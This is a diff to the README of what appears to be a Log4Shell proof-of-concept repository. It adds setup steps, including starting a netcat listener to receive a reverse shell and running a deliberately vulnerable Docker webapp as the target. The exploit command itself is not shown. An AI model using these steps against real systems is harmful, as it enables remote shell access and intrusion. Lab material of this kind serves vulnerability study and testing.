@@ -11,9 +11,40 @@ pip install -r requirements.txt
 ```
 
 #### Usage:
+* Clone this repo
+```sh
+git clone https://github.com/prasadashu/log4j-shell-poc.git
+```
+
+* Change directory to the cloned directory
+```sh
+cd log4j-shell-poc
+```
+
+* Install the requirements
+```sh
+pip install -r requirements.txt
+```
+
+* Install Java 8 JDK
+```sh
+apt install -y openjdk-8-jdk
+```
+
+* Copy the JDK to the current working directory
+```sh
+cp -r /usr/lib/jvm/java-8-openjdk-amd64 ./
+```
+
 * Start a netcat listener to accept reverse shell connection.<br>
 ```sh
 nc -lvnp 9001
+```
+
+* Start the vulnerable application
+```sh
+1: docker build -t log4j-vulnerable-application .
+2: docker run --network host log4j-vulnerable-application
 ```
 
 * Launch the exploit.<br>
@@ -44,7 +75,7 @@ A Dockerfile has been added with the vulnerable webapp.
 
 We can run the application using the following steps:
 
-```shell
+```sh
 1: docker build -t log4j-vulnerable-application .
 2: docker run --network host log4j-vulnerable-application
 ```
@@ -56,12 +87,12 @@ Getting the Java version.
 --------------------------------------
 
 We can install the required Java version using the below command.
-```shell
+```sh
 apt install -y openjdk-8-jdk
 ```
 
 Java versision installed will be
-```shell
+```sh
 openjdk version "1.8.0_342"
 OpenJDK Runtime Environment (build 1.8.0_342-8u342-b07-0ubuntu1~20.04-b07)
 OpenJDK 64-Bit Server VM (build 25.342-b07, mixed mode)
